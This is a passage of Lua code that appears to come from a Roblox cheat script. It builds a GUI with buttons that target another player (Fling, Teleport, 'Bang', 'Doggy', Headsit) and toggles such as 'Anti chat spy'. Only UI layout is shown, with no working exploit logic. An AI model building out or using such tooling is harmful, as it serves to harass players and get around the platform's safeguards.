ClickTargetTool_Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ClickTargetTool_Button.BackgroundTransparency = 1.000
ClickTargetTool_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ClickTargetTool_Button.BorderSizePixel = 0
ClickTargetTool_Button.Position = UDim2.new(0, 180, 0, 0)
ClickTargetTool_Button.Size = UDim2.new(0, 30, 0, 30)
ClickTargetTool_Button.Image = "rbxassetid://2716591855"

UserIDTargetLabel.Name = "UserIDTargetLabel"
UserIDTargetLabel.Parent = Target_Section
UserIDTargetLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
UserIDTargetLabel.BackgroundTransparency = 1.000
UserIDTargetLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
UserIDTargetLabel.BorderSizePixel = 0
UserIDTargetLabel.Position = UDim2.new(0, 150, 0, 70)
UserIDTargetLabel.Size = UDim2.new(0, 300, 0, 75)
UserIDTargetLabel.Font = Enum.Font.Oswald
UserIDTargetLabel.Text = "UserID: \nDisplay: \nJoined: "
UserIDTargetLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
UserIDTargetLabel.TextSize = 18.000
UserIDTargetLabel.TextWrapped = true
UserIDTargetLabel.TextXAlignment = Enum.TextXAlignment.Left
UserIDTargetLabel.TextYAlignment = Enum.TextYAlignment.Top

ViewTarget_Button.Name = "ViewTarget_Button"
ViewTarget_Button.Parent = Target_Section
ViewTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ViewTarget_Button.BackgroundTransparency = 0.500
ViewTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ViewTarget_Button.BorderSizePixel = 0
ViewTarget_Button.Position = UDim2.new(0, 210, 0, 150)
ViewTarget_Button.Size = UDim2.new(0, 150, 0, 30)
ViewTarget_Button.Font = Enum.Font.Oswald
ViewTarget_Button.Text = "View"
ViewTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ViewTarget_Button.TextScaled = true
ViewTarget_Button.TextSize = 14.000
ViewTarget_Button.TextWrapped = true

FlingTarget_Button.Name = "FlingTarget_Button"
FlingTarget_Button.Parent = Target_Section
FlingTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FlingTarget_Button.BackgroundTransparency = 0.500
FlingTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlingTarget_Button.BorderSizePixel = 0
FlingTarget_Button.Position = UDim2.new(0, 25, 0, 150)
FlingTarget_Button.Size = UDim2.new(0, 150, 0, 30)
FlingTarget_Button.Font = Enum.Font.Oswald
FlingTarget_Button.Text = "Fling"
FlingTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FlingTarget_Button.TextScaled = true
FlingTarget_Button.TextSize = 14.000
FlingTarget_Button.TextWrapped = true

FocusTarget_Button.Name = "FocusTarget_Button"
FocusTarget_Button.Parent = Target_Section
FocusTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FocusTarget_Button.BackgroundTransparency = 0.500
FocusTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FocusTarget_Button.BorderSizePixel = 0
FocusTarget_Button.Position = UDim2.new(0, 25, 0, 200)
FocusTarget_Button.Size = UDim2.new(0, 150, 0, 30)
FocusTarget_Button.Font = Enum.Font.Oswald
FocusTarget_Button.Text = "Focus"
FocusTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FocusTarget_Button.TextScaled = true
FocusTarget_Button.TextSize = 14.000
FocusTarget_Button.TextWrapped = true

BenxTarget_Button.Name = "BenxTarget_Button"
BenxTarget_Button.Parent = Target_Section
BenxTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
BenxTarget_Button.BackgroundTransparency = 0.500
BenxTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
BenxTarget_Button.BorderSizePixel = 0
BenxTarget_Button.Position = UDim2.new(0, 210, 0, 200)
BenxTarget_Button.Size = UDim2.new(0, 150, 0, 30)
BenxTarget_Button.Font = Enum.Font.Oswald
BenxTarget_Button.Text = "Bang"
BenxTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
BenxTarget_Button.TextScaled = true
BenxTarget_Button.TextSize = 14.000
BenxTarget_Button.TextWrapped = true

PushTarget_Button.Name = "PushTarget_Button"
PushTarget_Button.Parent = Target_Section
PushTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PushTarget_Button.BackgroundTransparency = 0.500
PushTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PushTarget_Button.BorderSizePixel = 0
PushTarget_Button.Position = UDim2.new(0, 25, 0, 400)
PushTarget_Button.Size = UDim2.new(0, 150, 0, 30)
PushTarget_Button.Font = Enum.Font.Oswald
PushTarget_Button.Text = "Push"
PushTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PushTarget_Button.TextScaled = true
PushTarget_Button.TextSize = 14.000
PushTarget_Button.TextWrapped = true

WhitelistTarget_Button.Name = "WhitelistTarget_Button"
WhitelistTarget_Button.Parent = Target_Section
WhitelistTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
WhitelistTarget_Button.BackgroundTransparency = 0.500
WhitelistTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
WhitelistTarget_Button.BorderSizePixel = 0
WhitelistTarget_Button.Position = UDim2.new(0, 210, 0, 400)
WhitelistTarget_Button.Size = UDim2.new(0, 150, 0, 30)
WhitelistTarget_Button.Font = Enum.Font.Oswald
WhitelistTarget_Button.Text = "Whitelist"
WhitelistTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
WhitelistTarget_Button.TextScaled = true
WhitelistTarget_Button.TextSize = 14.000
WhitelistTarget_Button.TextWrapped = true

TeleportTarget_Button.Name = "TeleportTarget_Button"
TeleportTarget_Button.Parent = Target_Section
TeleportTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
TeleportTarget_Button.BackgroundTransparency = 0.500
TeleportTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
TeleportTarget_Button.BorderSizePixel = 0
TeleportTarget_Button.Position = UDim2.new(0, 210, 0, 350)
TeleportTarget_Button.Size = UDim2.new(0, 150, 0, 30)
TeleportTarget_Button.Font = Enum.Font.Oswald
TeleportTarget_Button.Text = "Teleport"
TeleportTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
TeleportTarget_Button.TextScaled = true
TeleportTarget_Button.TextSize = 14.000
TeleportTarget_Button.TextWrapped = true

HeadsitTarget_Button.Name = "HeadsitTarget_Button"
HeadsitTarget_Button.Parent = Target_Section
HeadsitTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
HeadsitTarget_Button.BackgroundTransparency = 0.500
HeadsitTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
HeadsitTarget_Button.BorderSizePixel = 0
HeadsitTarget_Button.Position = UDim2.new(0, 210, 0, 250)
HeadsitTarget_Button.Size = UDim2.new(0, 150, 0, 30)
HeadsitTarget_Button.Font = Enum.Font.Oswald
HeadsitTarget_Button.Text = "Headsit"
HeadsitTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
HeadsitTarget_Button.TextScaled = true
HeadsitTarget_Button.TextSize = 14.000
HeadsitTarget_Button.TextWrapped = true

StandTarget_Button.Name = "StandTarget_Button"
StandTarget_Button.Parent = Target_Section
StandTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
StandTarget_Button.BackgroundTransparency = 0.500
StandTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
StandTarget_Button.BorderSizePixel = 0
StandTarget_Button.Position = UDim2.new(0, 25, 0, 250)
StandTarget_Button.Size = UDim2.new(0, 150, 0, 30)
StandTarget_Button.Font = Enum.Font.Oswald
StandTarget_Button.Text = "Stand"
StandTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
StandTarget_Button.TextScaled = true
StandTarget_Button.TextSize = 14.000
StandTarget_Button.TextWrapped = true

BackpackTarget_Button.Name = "BackpackTarget_Button"
BackpackTarget_Button.Parent = Target_Section
BackpackTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
BackpackTarget_Button.BackgroundTransparency = 0.500
BackpackTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
BackpackTarget_Button.BorderSizePixel = 0
BackpackTarget_Button.Position = UDim2.new(0, 210, 0, 300)
BackpackTarget_Button.Size = UDim2.new(0, 150, 0, 30)
BackpackTarget_Button.Font = Enum.Font.Oswald
BackpackTarget_Button.Text = "Backpack"
BackpackTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
BackpackTarget_Button.TextScaled = true
BackpackTarget_Button.TextSize = 14.000
BackpackTarget_Button.TextWrapped = true

DoggyTarget_Button.Name = "DoggyTarget_Button"
DoggyTarget_Button.Parent = Target_Section
DoggyTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
DoggyTarget_Button.BackgroundTransparency = 0.500
DoggyTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
DoggyTarget_Button.BorderSizePixel = 0
DoggyTarget_Button.Position = UDim2.new(0, 25, 0, 300)
DoggyTarget_Button.Size = UDim2.new(0, 150, 0, 30)
DoggyTarget_Button.Font = Enum.Font.Oswald
DoggyTarget_Button.Text = "Doggy"
DoggyTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
DoggyTarget_Button.TextScaled = true
DoggyTarget_Button.TextSize = 14.000
DoggyTarget_Button.TextWrapped = true

DragTarget_Button.Name = "DragTarget_Button"
DragTarget_Button.Parent = Target_Section
DragTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
DragTarget_Button.BackgroundTransparency = 0.500
DragTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
DragTarget_Button.BorderSizePixel = 0
DragTarget_Button.Position = UDim2.new(0, 25, 0, 350)
DragTarget_Button.Size = UDim2.new(0, 150, 0, 30)
DragTarget_Button.Font = Enum.Font.Oswald
DragTarget_Button.Text = "Drag"
DragTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
DragTarget_Button.TextScaled = true
DragTarget_Button.TextSize = 14.000
DragTarget_Button.TextWrapped = true

Animations_Section.Name = "Animations_Section"
Animations_Section.Parent = Background
Animations_Section.Active = true
Animations_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Animations_Section.BackgroundTransparency = 1.000
Animations_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Animations_Section.BorderSizePixel = 0
Animations_Section.Position = UDim2.new(0, 105, 0, 30)
Animations_Section.Size = UDim2.new(0, 395, 0, 320)
Animations_Section.Visible = false
Animations_Section.CanvasSize = UDim2.new(0, 0, 1.6, 0)
Animations_Section.ScrollBarThickness = 5

VampireAnim_Button.Name = "VampireAnim_Button"
VampireAnim_Button.Parent = Animations_Section
VampireAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
VampireAnim_Button.BackgroundTransparency = 0.500
VampireAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
VampireAnim_Button.BorderSizePixel = 0
VampireAnim_Button.Position = UDim2.new(0, 25, 0, 25)
VampireAnim_Button.Size = UDim2.new(0, 150, 0, 30)
VampireAnim_Button.Font = Enum.Font.Oswald
VampireAnim_Button.Text = "Vampire"
VampireAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
VampireAnim_Button.TextScaled = true
VampireAnim_Button.TextSize = 14.000
VampireAnim_Button.TextWrapped = true

HeroAnim_Button.Name = "HeroAnim_Button"
HeroAnim_Button.Parent = Animations_Section
HeroAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
HeroAnim_Button.BackgroundTransparency = 0.500
HeroAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
HeroAnim_Button.BorderSizePixel = 0
HeroAnim_Button.Position = UDim2.new(0, 210, 0, 25)
HeroAnim_Button.Size = UDim2.new(0, 150, 0, 30)
HeroAnim_Button.Font = Enum.Font.Oswald
HeroAnim_Button.Text = "Hero"
HeroAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
HeroAnim_Button.TextScaled = true
HeroAnim_Button.TextSize = 14.000
HeroAnim_Button.TextWrapped = true

ZombieClassicAnim_Button.Name = "ZombieClassicAnim_Button"
ZombieClassicAnim_Button.Parent = Animations_Section
ZombieClassicAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ZombieClassicAnim_Button.BackgroundTransparency = 0.500
ZombieClassicAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ZombieClassicAnim_Button.BorderSizePixel = 0
ZombieClassicAnim_Button.Position = UDim2.new(0, 25, 0, 75)
ZombieClassicAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ZombieClassicAnim_Button.Font = Enum.Font.Oswald
ZombieClassicAnim_Button.Text = "Zombie Classic"
ZombieClassicAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ZombieClassicAnim_Button.TextScaled = true
ZombieClassicAnim_Button.TextSize = 14.000
ZombieClassicAnim_Button.TextWrapped = true

MageAnim_Button.Name = "MageAnim_Button"
MageAnim_Button.Parent = Animations_Section
MageAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
MageAnim_Button.BackgroundTransparency = 0.500
MageAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
MageAnim_Button.BorderSizePixel = 0
MageAnim_Button.Position = UDim2.new(0, 210, 0, 75)
MageAnim_Button.Size = UDim2.new(0, 150, 0, 30)
MageAnim_Button.Font = Enum.Font.Oswald
MageAnim_Button.Text = "Mage"
MageAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
MageAnim_Button.TextScaled = true
MageAnim_Button.TextSize = 14.000
MageAnim_Button.TextWrapped = true

GhostAnim_Button.Name = "GhostAnim_Button"
GhostAnim_Button.Parent = Animations_Section
GhostAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
GhostAnim_Button.BackgroundTransparency = 0.500
GhostAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
GhostAnim_Button.BorderSizePixel = 0
GhostAnim_Button.Position = UDim2.new(0, 25, 0, 125)
GhostAnim_Button.Size = UDim2.new(0, 150, 0, 30)
GhostAnim_Button.Font = Enum.Font.Oswald
GhostAnim_Button.Text = "Ghost"
GhostAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
GhostAnim_Button.TextScaled = true
GhostAnim_Button.TextSize = 14.000
GhostAnim_Button.TextWrapped = true

ElderAnim_Button.Name = "ElderAnim_Button"
ElderAnim_Button.Parent = Animations_Section
ElderAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ElderAnim_Button.BackgroundTransparency = 0.500
ElderAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ElderAnim_Button.BorderSizePixel = 0
ElderAnim_Button.Position = UDim2.new(0, 210, 0, 125)
ElderAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ElderAnim_Button.Font = Enum.Font.Oswald
ElderAnim_Button.Text = "Elder"
ElderAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ElderAnim_Button.TextScaled = true
ElderAnim_Button.TextSize = 14.000
ElderAnim_Button.TextWrapped = true

LevitationAnim_Button.Name = "LevitationAnim_Button"
LevitationAnim_Button.Parent = Animations_Section
LevitationAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
LevitationAnim_Button.BackgroundTransparency = 0.500
LevitationAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
LevitationAnim_Button.BorderSizePixel = 0
LevitationAnim_Button.Position = UDim2.new(0, 25, 0, 175)
LevitationAnim_Button.Size = UDim2.new(0, 150, 0, 30)
LevitationAnim_Button.Font = Enum.Font.Oswald
LevitationAnim_Button.Text = "Levitation"
LevitationAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
LevitationAnim_Button.TextScaled = true
LevitationAnim_Button.TextSize = 14.000
LevitationAnim_Button.TextWrapped = true

AstronautAnim_Button.Name = "AstronautAnim_Button"
AstronautAnim_Button.Parent = Animations_Section
AstronautAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AstronautAnim_Button.BackgroundTransparency = 0.500
AstronautAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AstronautAnim_Button.BorderSizePixel = 0
AstronautAnim_Button.Position = UDim2.new(0, 210, 0, 175)
AstronautAnim_Button.Size = UDim2.new(0, 150, 0, 30)
AstronautAnim_Button.Font = Enum.Font.Oswald
AstronautAnim_Button.Text = "Astronaut"
AstronautAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AstronautAnim_Button.TextScaled = true
AstronautAnim_Button.TextSize = 14.000
AstronautAnim_Button.TextWrapped = true

NinjaAnim_Button.Name = "NinjaAnim_Button"
NinjaAnim_Button.Parent = Animations_Section
NinjaAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
NinjaAnim_Button.BackgroundTransparency = 0.500
NinjaAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
NinjaAnim_Button.BorderSizePixel = 0
NinjaAnim_Button.Position = UDim2.new(0, 25, 0, 225)
NinjaAnim_Button.Size = UDim2.new(0, 150, 0, 30)
NinjaAnim_Button.Font = Enum.Font.Oswald
NinjaAnim_Button.Text = "Ninja"
NinjaAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
NinjaAnim_Button.TextScaled = true
NinjaAnim_Button.TextSize = 14.000
NinjaAnim_Button.TextWrapped = true

WerewolfAnim_Button.Name = "WerewolfAnim_Button"
WerewolfAnim_Button.Parent = Animations_Section
WerewolfAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
WerewolfAnim_Button.BackgroundTransparency = 0.500
WerewolfAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
WerewolfAnim_Button.BorderSizePixel = 0
WerewolfAnim_Button.Position = UDim2.new(0, 210, 0, 225)
WerewolfAnim_Button.Size = UDim2.new(0, 150, 0, 30)
WerewolfAnim_Button.Font = Enum.Font.Oswald
WerewolfAnim_Button.Text = "Werewolf"
WerewolfAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
WerewolfAnim_Button.TextScaled = true
WerewolfAnim_Button.TextSize = 14.000
WerewolfAnim_Button.TextWrapped = true

CartoonAnim_Button.Name = "CartoonAnim_Button"
CartoonAnim_Button.Parent = Animations_Section
CartoonAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CartoonAnim_Button.BackgroundTransparency = 0.500
CartoonAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CartoonAnim_Button.BorderSizePixel = 0
CartoonAnim_Button.Position = UDim2.new(0, 25, 0, 275)
CartoonAnim_Button.Size = UDim2.new(0, 150, 0, 30)
CartoonAnim_Button.Font = Enum.Font.Oswald
CartoonAnim_Button.Text = "Cartoon"
CartoonAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CartoonAnim_Button.TextScaled = true
CartoonAnim_Button.TextSize = 14.000
CartoonAnim_Button.TextWrapped = true

PirateAnim_Button.Name = "PirateAnim_Button"
PirateAnim_Button.Parent = Animations_Section
PirateAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PirateAnim_Button.BackgroundTransparency = 0.500
PirateAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PirateAnim_Button.BorderSizePixel = 0
PirateAnim_Button.Position = UDim2.new(0, 210, 0, 275)
PirateAnim_Button.Size = UDim2.new(0, 150, 0, 30)
PirateAnim_Button.Font = Enum.Font.Oswald
PirateAnim_Button.Text = "Pirate"
PirateAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PirateAnim_Button.TextScaled = true
PirateAnim_Button.TextSize = 14.000
PirateAnim_Button.TextWrapped = true

SneakyAnim_Button.Name = "SneakyAnim_Button"
SneakyAnim_Button.Parent = Animations_Section
SneakyAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SneakyAnim_Button.BackgroundTransparency = 0.500
SneakyAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SneakyAnim_Button.BorderSizePixel = 0
SneakyAnim_Button.Position = UDim2.new(0, 25, 0, 325)
SneakyAnim_Button.Size = UDim2.new(0, 150, 0, 30)
SneakyAnim_Button.Font = Enum.Font.Oswald
SneakyAnim_Button.Text = "Sneaky"
SneakyAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SneakyAnim_Button.TextScaled = true
SneakyAnim_Button.TextSize = 14.000
SneakyAnim_Button.TextWrapped = true

ToyAnim_Button.Name = "ToyAnim_Button"
ToyAnim_Button.Parent = Animations_Section
ToyAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ToyAnim_Button.BackgroundTransparency = 0.500
ToyAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ToyAnim_Button.BorderSizePixel = 0
ToyAnim_Button.Position = UDim2.new(0, 210, 0, 325)
ToyAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ToyAnim_Button.Font = Enum.Font.Oswald
ToyAnim_Button.Text = "Toy"
ToyAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ToyAnim_Button.TextScaled = true
ToyAnim_Button.TextSize = 14.000
ToyAnim_Button.TextWrapped = true

KnightAnim_Button.Name = "KnightAnim_Button"
KnightAnim_Button.Parent = Animations_Section
KnightAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
KnightAnim_Button.BackgroundTransparency = 0.500
KnightAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
KnightAnim_Button.BorderSizePixel = 0
KnightAnim_Button.Position = UDim2.new(0, 25, 0, 375)
KnightAnim_Button.Size = UDim2.new(0, 150, 0, 30)
KnightAnim_Button.Font = Enum.Font.Oswald
KnightAnim_Button.Text = "Knight"
KnightAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
KnightAnim_Button.TextScaled = true
KnightAnim_Button.TextSize = 14.000
KnightAnim_Button.TextWrapped = true

ConfidentAnim_Button.Name = "ConfidentAnim_Button"
ConfidentAnim_Button.Parent = Animations_Section
ConfidentAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ConfidentAnim_Button.BackgroundTransparency = 0.500
ConfidentAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ConfidentAnim_Button.BorderSizePixel = 0
ConfidentAnim_Button.Position = UDim2.new(0, 210, 0, 375)
ConfidentAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ConfidentAnim_Button.Font = Enum.Font.Oswald
ConfidentAnim_Button.Text = "Confident"
ConfidentAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ConfidentAnim_Button.TextScaled = true
ConfidentAnim_Button.TextSize = 14.000
ConfidentAnim_Button.TextWrapped = true

PopstarAnim_Button.Name = "PopstarAnim_Button"
PopstarAnim_Button.Parent = Animations_Section
PopstarAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PopstarAnim_Button.BackgroundTransparency = 0.500
PopstarAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PopstarAnim_Button.BorderSizePixel = 0
PopstarAnim_Button.Position = UDim2.new(0, 25, 0, 425)
PopstarAnim_Button.Size = UDim2.new(0, 150, 0, 30)
PopstarAnim_Button.Font = Enum.Font.Oswald
PopstarAnim_Button.Text = "Popstar"
PopstarAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PopstarAnim_Button.TextScaled = true
PopstarAnim_Button.TextSize = 14.000
PopstarAnim_Button.TextWrapped = true

PrincessAnim_Button.Name = "PrincessAnim_Button"
PrincessAnim_Button.Parent = Animations_Section
PrincessAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PrincessAnim_Button.BackgroundTransparency = 0.500
PrincessAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PrincessAnim_Button.BorderSizePixel = 0
PrincessAnim_Button.Position = UDim2.new(0, 210, 0, 425)
PrincessAnim_Button.Size = UDim2.new(0, 150, 0, 30)
PrincessAnim_Button.Font = Enum.Font.Oswald
PrincessAnim_Button.Text = "Princess"
PrincessAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PrincessAnim_Button.TextScaled = true
PrincessAnim_Button.TextSize = 14.000
PrincessAnim_Button.TextWrapped = true

CowboyAnim_Button.Name = "CowboyAnim_Button"
CowboyAnim_Button.Parent = Animations_Section
CowboyAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CowboyAnim_Button.BackgroundTransparency = 0.500
CowboyAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CowboyAnim_Button.BorderSizePixel = 0
CowboyAnim_Button.Position = UDim2.new(0, 25, 0, 475)
CowboyAnim_Button.Size = UDim2.new(0, 150, 0, 30)
CowboyAnim_Button.Font = Enum.Font.Oswald
CowboyAnim_Button.Text = "Cowboy"
CowboyAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CowboyAnim_Button.TextScaled = true
CowboyAnim_Button.TextSize = 14.000
CowboyAnim_Button.TextWrapped = true

PatrolAnim_Button.Name = "PatrolAnim_Button"
PatrolAnim_Button.Parent = Animations_Section
PatrolAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PatrolAnim_Button.BackgroundTransparency = 0.500
PatrolAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PatrolAnim_Button.BorderSizePixel = 0
PatrolAnim_Button.Position = UDim2.new(0, 210, 0, 475)
PatrolAnim_Button.Size = UDim2.new(0, 150, 0, 30)
PatrolAnim_Button.Font = Enum.Font.Oswald
PatrolAnim_Button.Text = "Patrol"
PatrolAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PatrolAnim_Button.TextScaled = true
PatrolAnim_Button.TextSize = 14.000
PatrolAnim_Button.TextWrapped = true

ZombieFEAnim_Button.Name = "ZombieFEAnim_Button"
ZombieFEAnim_Button.Parent = Animations_Section
ZombieFEAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ZombieFEAnim_Button.BackgroundTransparency = 0.500
ZombieFEAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ZombieFEAnim_Button.BorderSizePixel = 0
ZombieFEAnim_Button.Position = UDim2.new(0, 25, 0, 525)
ZombieFEAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ZombieFEAnim_Button.Font = Enum.Font.Oswald
ZombieFEAnim_Button.Text = "FE Zombie"
ZombieFEAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ZombieFEAnim_Button.TextScaled = true
ZombieFEAnim_Button.TextSize = 14.000
ZombieFEAnim_Button.TextWrapped = true

Misc_Section.Name = "Misc_Section"
Misc_Section.Parent = Background
Misc_Section.Active = true
Misc_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Misc_Section.BackgroundTransparency = 1.000
Misc_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Misc_Section.BorderSizePixel = 0
Misc_Section.Position = UDim2.new(0, 105, 0, 30)
Misc_Section.Size = UDim2.new(0, 395, 0, 320)
Misc_Section.Visible = false
Misc_Section.CanvasSize = UDim2.new(0, 0, 1.1, 0)
Misc_Section.ScrollBarThickness = 5

AntiFling_Button.Name = "AntiFling_Button"
AntiFling_Button.Parent = Misc_Section
AntiFling_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AntiFling_Button.BackgroundTransparency = 0.500
AntiFling_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiFling_Button.BorderSizePixel = 0
AntiFling_Button.Position = UDim2.new(0, 25, 0, 25)
AntiFling_Button.Size = UDim2.new(0, 150, 0, 30)
AntiFling_Button.Font = Enum.Font.Oswald
AntiFling_Button.Text = "Anti fling"
AntiFling_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiFling_Button.TextScaled = true
AntiFling_Button.TextSize = 14.000
AntiFling_Button.TextWrapped = true

AntiAFK_Button.Name = "AntiAFK_Button"
AntiAFK_Button.Parent = Misc_Section
AntiAFK_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AntiAFK_Button.BackgroundTransparency = 0.500
AntiAFK_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiAFK_Button.BorderSizePixel = 0
AntiAFK_Button.Position = UDim2.new(0, 25, 0, 75)
AntiAFK_Button.Size = UDim2.new(0, 150, 0, 30)
AntiAFK_Button.Font = Enum.Font.Oswald
AntiAFK_Button.Text = "Anti AFK"
AntiAFK_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiAFK_Button.TextScaled = true
AntiAFK_Button.TextSize = 14.000
AntiAFK_Button.TextWrapped = true

AntiChatSpy_Button.Name = "AntiChatSpy_Button"
AntiChatSpy_Button.Parent = Misc_Section
AntiChatSpy_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AntiChatSpy_Button.BackgroundTransparency = 0.500
AntiChatSpy_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiChatSpy_Button.BorderSizePixel = 0
AntiChatSpy_Button.Position = UDim2.new(0, 210, 0, 25)
AntiChatSpy_Button.Size = UDim2.new(0, 150, 0, 30)
AntiChatSpy_Button.Font = Enum.Font.Oswald
AntiChatSpy_Button.Text = "Anti chat spy"
AntiChatSpy_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiChatSpy_Button.TextScaled = true
AntiChatSpy_Button.TextSize = 14.000
AntiChatSpy_Button.TextWrapped = true

Shaders_Button.Name = "Shaders_Button"
Shaders_Button.Parent = Misc_Section
